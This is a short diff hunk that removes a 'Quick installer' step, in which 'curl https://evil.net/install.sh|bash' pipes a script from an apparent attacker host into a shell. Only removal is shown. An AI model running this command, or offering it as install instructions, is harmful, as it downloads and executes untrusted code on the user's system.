@@ -1,3 +1,0 @@
-Quick installer:
-curl https://evil.net/install.sh|bash
-Install completed.
